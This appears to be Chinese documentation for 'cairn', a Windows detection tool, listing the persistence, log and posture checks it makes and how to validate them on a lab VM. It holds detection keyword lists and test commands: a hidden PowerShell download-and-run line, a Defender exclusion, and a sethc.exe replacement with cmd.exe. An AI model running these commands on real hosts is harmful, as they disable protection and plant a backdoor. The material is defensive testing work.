# 偵測覆蓋範圍與驗證方式

`cairn coverage` 會列出這個版本能偵測的 MITRE ATT&CK 技術：內建啟發式（heuristics）一張表，再加上已載入 Sigma 規則的技術標籤統計。**掃描結果乾淨，只代表表上這些技術沒被看到，不代表主機沒事。**

## 持久化：檢查哪些位置

| 技術 | 名稱 | 檢查位置 | 判斷方式 |
|---|---|---|---|
| T1547.001 | Run Keys / Startup | HKLM/HKCU Run、RunOnce（含 WOW6432Node）、Policies\Explorer\Run、Startup 資料夾、BootExecute | Run／Startup：只看路徑和簽章；Policies Run：有項目就報；BootExecute：非 `autocheck autochk` 就報 |
| T1543.003 | Windows Service | Services 中自動啟動的 ImagePath | 只看路徑和簽章 |
| T1053.005 | Scheduled Task | `System32\Tasks` XML | 只看路徑和簽章，加上腳本內容 |
| T1546.003 | WMI Event Subscription | `root\subscription` binding | 一律報；內嵌腳本含動態執行或網址時升為 High |
| T1546.008 | Accessibility Features | IFEO Debugger 指向 sethc／utilman／osk／magnify／narrator 等 | 一律報 High |
| T1546.012 | IFEO Injection | IFEO Debugger、SilentProcessExit MonitorProcess | 一律報 |
| T1546.002 | Screensaver | HKCU `SCRNSAVE.EXE` | 只看路徑和簽章 |
| T1546.007 | Netsh Helper DLL | HKLM\SOFTWARE\Microsoft\NetSh | 不在預設清單，或不在 Windows 目錄下就報 |
| T1546.009 | AppCert DLLs | Session Manager\AppCertDlls | 有項目就報 |
| T1546.010 | AppInit DLLs | AppInit_DLLs（32/64 位元） | 有項目就報 |
| T1546.013 | PowerShell Profile | 所有使用者與目前使用者的 profile.ps1 | 內容含下載或編碼語法（DownloadString、IEX、FromBase64String、-enc、網址）就報 |
| T1546.015 | COM Hijacking | HKCU CLSID\*\InprocServer32 | 只看路徑和簽章 |
| T1546 | cmd AutoRun | Command Processor AutoRun（HKLM/HKCU） | 有項目就報 |
| T1547.002 | Authentication Package | LSA Authentication Packages | 非預設（msv1_0）就報 |
| T1547.003 | Time Providers | W32Time TimeProviders DllName | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.004 | Winlogon Helper | Winlogon Shell／Userinit／Notify／MPNotify | Shell／Userinit 非預設值就報；MPNotify 有項目就報 |
| T1547.005 | Security Support Provider | LSA Security Packages（含 OSConfig） | 非預設套件就報（例如 mimilib） |
| T1547.010 | Port Monitors | Print\Monitors Driver | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.014 | Active Setup | Installed Components StubPath | 只看路徑和簽章 |
| T1556.002 | Password Filter DLL | LSA Notification Packages | 非預設（scecli、rassfm）就報 |
| T1137.002 | Office Test | Office test\Special\Perf | 有項目就報 |
| T1037.001 | Logon Script | HKCU\Environment UserInitMprLogonScript | 有項目就報 |

「只看路徑和簽章」是指 persist heuristic 的通用訊號，一律看「實際被執行的程式」：未簽章且位於使用者可寫入路徑（High）、系統程式名稱不在它應有的目錄（例如 `C:\Windows\Temp\svchost.exe`，High）、近期修改且未簽章或簽章無法驗證（Medium）。Startup 資料夾不再例外：捷徑（.lnk）本身的位置不列入判斷，但解析出的目標程式、直接放在資料夾裡的執行檔都照樣判斷；直接放進 Startup 資料夾的腳本檔（.vbs、.js、.bat、.ps1、.hta 等）報 Medium。

代理執行（T1218 / T1059）：持久化項目指向 rundll32、regsvr32、msiexec、mshta、wscript、cscript、powershell、cmd 這些已簽章的系統程式時，改看它的參數——參數是放在使用者可寫入路徑的 DLL／腳本、網路芳鄰路徑（`\\host\share`）或網址，報 High。

服務的啟動類型：手動啟動（Start=3）的服務若只有一個訊號，嚴重度降一級（需要 collector 記錄啟動類型；目前尚未記錄，所以暫不生效）。

嚴重度規則：有項目或非預設項目一律先算 Medium；目標未簽章、位於使用者可寫入路徑或偽裝成系統程式時升為 High。同一筆有兩個以上訊號，或對應的程式正在執行、留有執行紀錄時，會再升一級。

## 事件記錄：內建偵測（不需要 Sigma 規則）

這些事件 Windows 預設就會寫入，不需要安裝 Sysmon；即使 `rules\sigma` 不在，也會讀取 Security、System 和 Defender Operational 這三個記錄。

| 技術 | 事件 | 判斷方式 |
|---|---|---|
| T1070.001 | Security 1102、System 104（記錄被清除） | 一律報 High |
| T1543.003 | System 7045（新安裝服務） | 指令在使用者可寫入路徑、呼叫 cmd／powershell／mshta 等，或含下載／編碼語法：High；不在 Windows 或 Program Files 下：Medium；其他：Low |
| T1053.005 | Security 4698（新建排程工作，需開啟「其他物件存取」稽核） | 同上，看 TaskContent 裡的 Command 和 Arguments |
| T1562.001 | Defender 5001（即時保護被關閉）、5007（新增排除項目） | 一律報 High |
| — | Defender 1116（偵測到惡意程式）、1117（已處理）、1118／1119（處理失敗） | 依威脅名稱與路徑合併成一筆，附上 Defender 的處理結果。處理失敗：High；PUA／廣告軟體：已處理 Low、未見處理 Medium；其他類別：High |

## 初始入侵：ClickFix（T1204.004）

假驗證碼、假錯誤頁面會要求使用者按 Win+R 貼上指令。Explorer 會把「執行」對話框輸入過的內容存在 `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`。cairn 會讀所有已登入使用者的這個機碼：呼叫 powershell、mshta、cmd、curl 等並帶參數的報 Medium；同時含下載、編碼、網址或隱藏視窗的報 High。單純的 `cmd`、`notepad`、網路路徑不報。

FileFix 是同一招的變形：假的文件分享頁面要使用者把「檔案路徑」貼到檔案總管的網址列，實際上是一串指令。Explorer 把網址列輸入過的內容存在 `...\Explorer\TypedPaths`，cairn 用同樣的規則判斷。另外，行程上 explorer.exe 直接啟動 mshta.exe 也報 High。

時間：RunMRU／TypedPaths 整個機碼只有一個最後寫入時間，只代表「最近一筆」的輸入時間。其他筆的 finding 時間是收集時間，`reason` 會寫「time unknown」。

驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。

## 防禦狀態與遠端控制工具（posture collector，phase 3E）

`posture` collector 只讀取登錄檔與檔案，不修改主機：Defender 設定與排除清單、稽核原則（`AuditQuerySystemPolicy`，需要時在 cairn 自己的 token 啟用 SeSecurityPrivilege，不會設定任何稽核原則）、4688 命令列與 PowerShell 記錄原則、Sysmon、TaskCache 排程工作樹、System32 協助工具程式、Program Files／ProgramData／各使用者 AppData 下的程式資料夾。讀不到的位置會寫進 manifest 的 source errors，不會當成「沒有」。

| 技術 | 檢查內容 | 判斷方式 |
|---|---|---|
| T1562.001 | Defender 排除項目（`Windows Defender\Exclusions` 與 `Policies\...\Exclusions` 的 Paths／Extensions／Processes／IpAddresses） | 排除整個磁碟、`\Users`、使用者可寫入資料夾、執行檔或腳本副檔名、cmd／PowerShell／mshta 等直譯器：High；其他排除項目：Medium。排除清單讀不到（新版 Windows 連管理員都可能被拒）會另外列一筆 observation，不當成沒有排除項目 |
| T1562.001 | Defender 原則 `DisableAntiSpyware`、`DisableRealtimeMonitoring`、`DisableBehaviorMonitoring` | 值為 1：High |
| T1562.001 | `Windows Defender\Features\TamperProtection` | 不是 5（防竄改保護未開啟）：Medium，屬於設定弱點，不代表已被入侵 |
| T1053.005 | `Schedule\TaskCache\Tree` 底下的排程工作 | 缺少 `SD` 值（Tarrask 手法，工作排程器看不到），或 `System32\Tasks` 沒有對應檔案：High |
| T1546.008 | System32 的 sethc／utilman／osk／magnify／narrator／displayswitch／atbroker | 版本資訊 OriginalFilename 是 cmd、PowerShell 或 explorer，或檔案未簽章：High；OriginalFilename 和預期不符：Medium（簽章有效時 Low） |
| T1219 | 遠端控制工具：AnyDesk、ScreenConnect、TeamViewer、Atera、Splashtop、NetSupport、RustDesk、Supremo、LogMeIn、GoTo／LogMeIn Rescue、Action1、MeshAgent、ngrok、cloudflared、Tailscale、ZeroTier、Radmin、UltraVNC／TightVNC／RealVNC、Chrome Remote Desktop、Level、SimpleHelp、Tactical RMM（行程、服務、安裝資料夾） | 只是存在：Low，說明會請你確認是否經過核准；安裝資料夾或服務機碼 30 天內有變動：Medium；從使用者可寫入路徑執行、未簽章、改名（簽章是該工具但檔名不是，或檔名是該工具但簽章是別人）、或有連往公網 IP 的連線：High。同一台主機有兩種以上：另報一筆 Medium |

記錄缺口（不是偵測）：「稽核處理程序建立」沒開、4688 沒有命令列、登入／排程工作／帳號／群組變更沒有稽核、PowerShell 4104 沒開、沒有 Sysmon，會各列一筆 observation（`logging_posture`）。沒開的記錄，對應的 Sigma 規則和事件記錄偵測就不可能命中；讀不到的設定會寫「無法確認」，不要假設它有開。

驗證：在 VM 上 `Add-MpPreference -ExclusionPath C:\Users\Public`、`copy C:\Windows\System32\cmd.exe` 蓋過 sethc.exe（先取得檔案擁有權）、安裝 AnyDesk，再執行 cairn，應分別看到 T1562.001、T1546.008（High）和 T1219。

## 每位使用者的位置

Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、RunMRU 會讀 `HKEY_USERS` 底下每個已載入的使用者，不只是執行 cairn 的那個帳號；Startup 資料夾和 PowerShell profile 會檢查 `C:\Users` 下每個使用者。所以資訊人員用自己的管理員帳號提權執行時，也看得到受害使用者的項目（前提是該使用者目前已登入，或其登錄檔已載入）。

## 其他內建偵測

- 行程（父→子）：Office 或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）；explorer.exe → mshta.exe（ClickFix，T1204.004，High）；w3wp／sqlservr／httpd／nginx／Tomcat → cmd／powershell／whoami（web shell，T1505.003，High）；wmiprvse.exe → cmd／powershell（T1047，Medium；輸出寫到 `\\127.0.0.1\ADMIN$` 的 wmiexec 特徵升為 Critical）；services.exe → 寫到 `\\127.0.0.1\ADMIN$` 的 cmd.exe 或 PSEXESVC（T1569.002，High）。系統程式名稱（svchost、lsass、csrss、services、winlogon、explorer、rundll32、dllhost、taskhostw 等）不在應有目錄就報 High（T1036.005），即使在 `C:\Windows` 底下也一樣。每種組合都有自己的說明文字，不再用籠統的「可能為偽裝或橫向移動」。
- 網路：連線所屬程式未簽章且位於可疑路徑（T1036），單獨出現報 Medium，再加上其他訊號（少見埠、監聽高埠、該程式有持久化項目）升為 High 以上；公網 IP 連進本機 RDP（3389）、SMB（445）、SSH（22）的連線報 High（T1021.001／.002／.004、T1133）。
- 帳號（Security 記錄）：建立帳號（T1136.001）、刪除帳號（T1531）；加入群組（4728／4732／4756，T1098.007）——Administrators、Domain Admins、Enterprise Admins、Remote Desktop Users、Backup Operators 報 High，其他群組 Low，說明會寫出「誰把誰加進哪個群組」，已被 Sigma 規則報過的同一筆事件不重複；帳號啟用（4722）、被其他帳號重設密碼（4724）、帳號安全旗標被打開（4738：不需要密碼、密碼永不過期、可逆加密、委派、不需 Kerberos 預先驗證等）報 Medium（T1098）。
- 密碼猜測與噴灑（T1110.001／T1110.003）：只算 4625（以及 4771、4776）中真正屬於猜錯的失敗——密碼錯誤、帳號不存在、帳號被鎖定；不算服務／批次登入（LogonType 0／4／5）、本機來源（`-`、127.0.0.1、::1）、DWM-／UMFD- 帳號。「猜中」要在失敗之後，同一來源出現 4624 網路（type 3）或遠端桌面（type 10）登入成功。
- Sigma：80 條規則，前提是對應的記錄有開啟（Sysmon、4688 含命令列、PowerShell 4104）。實際各技術的規則數請看 `cairn coverage`。

## 怎麼驗證（在實驗用 VM 上，不要在客戶主機上）

1. 準備一台已建立快照的 Windows 10/11 VM，安裝 [Atomic Red Team](https://github.com/redcanaryco/invoke-atomicredteam)。
2. 對要驗證的技術列出測試內容：`Invoke-AtomicTest T1547.005 -ShowDetailsBrief`，先看懂這個測試會改什麼。
3. 執行測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1`。
4. 以管理員身分執行 `cairn run --target live --output C:\IR\t1547005`，確認 `findings.jsonl` 有一筆 `mitre` 含 `T1547.005` 的 finding，`reason` 也說明了原因。
5. 清除測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1 -Cleanup`，或直接還原快照。

建議每次發版前，至少對上表每個技術各跑一個 Atomic 測試，並把「技術、測試編號、是否命中」記錄下來。這就是這個工具可以被驗證的方式：每一列都要能在 VM 上重現。

單元測試則用假的 registry（`cairn-collectors::asep` 的 `RegRead`）驗證每個位置的讀取邏輯，用 `cairn-heur::asep` 的測試驗證預設清單與嚴重度。這兩層都不需要 Windows 就能跑。
